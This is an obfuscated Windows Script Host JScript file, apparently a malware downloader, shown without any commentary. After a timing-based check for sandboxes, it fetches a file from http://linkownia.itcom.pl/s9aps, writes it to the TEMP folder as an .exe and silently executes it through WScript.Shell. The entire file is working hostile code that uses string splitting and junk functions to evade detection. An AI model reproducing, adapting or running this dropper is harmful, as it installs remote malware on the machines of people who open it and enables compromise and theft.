var _CU = false;
var _BP = "CreateObject";
var _VB = function _F() {return WScript[_BP]("WScript"+".Shell");}(), _JX = 11;
var _J = "MSXML2.XMLHTTP";
var _V = 2123213;
var _FG = 0;
function _MC(_C){_VB["Run"](_C, _FG, _FG);};
function _PS(){return _J + "";};
function _JP(_B, _K){_FG = _FG * 1; return _B - _K;};
function _QU(){return _BP;};
/*@cc_on
  @if (@_win32 || @_win64)
    _CU = true;
  @end
@*/
if (_CU)
{
var _OJ = "";
function _OL(){return 22;};
var _JC = 0; var _O = 0;
function _YB()
{
var _KR = new this["Date"]();
var _VK = _KR["getUTCMilliseconds"]();
WScript["Sleep"](_OL());
var _KR = new this["Date"]();
var _G = _KR["getUTCMilliseconds"]();
WScript["Sleep"](_OL());
var _KR = new this["Date"]();
var _AP = _KR["getUTCMilliseconds"]();
var _JC = "_KQ";
_JC = _JP(_G, _VK);
var _O = "_M";
_O = _JP(_AP, _G);
_OJ = "open";
return _JP(_JC, _O);
}
var _Y0 = false;
var _NT = false;
for (var _W = _FG; _W < _OL() * 1; _W++){if (_YB() != _FG){
_Y0 = true; 
_O = "31" + 11 * _JC + _O; 
_NT = true; 
break;
}}
function _FU() {return ((_Y0 == true) && (_Y0 == _NT)) ? 1 : _FG;};
if (_Y0 && _FU() && _NT){
function _OE() {return _VB["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "xGZ4gPKUPyfgFA.ex" + "e";};
 _G0 = _PS();
 _U = WScript[_BP](_G0);
 var _Y = 1;
 while (_Y){
try {
	if (_Y == 1)
	{
		_U[_OJ]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_U["send"]();
		_BR = "Sleep";
	}
	WScript[_BR](_OL() + 120); 
	if (_U["readystate"] < 2 * 2) continue;
	_Y = _FG;
	function _BZ(_IQ) {var _JZ = (1, 2, 3, 4, 5, _IQ); return _JZ;};
	_AI = WScript[_QU()]("ADODB.Stream");
	_G0 = _AI;
	_G0[_OJ]();
	_G0["type"] = _BZ(1);
	_G0["write"](_U["ResponseBody"]);
	_AI["position"] = _BZ(_FG);
	_G0["Save" + "ToFile"](_OE(), 2);
	_AI["cl"+"ose"]();
	_I = _OE();
	_MC(_I);
} catch(_TD){};
}
}
}

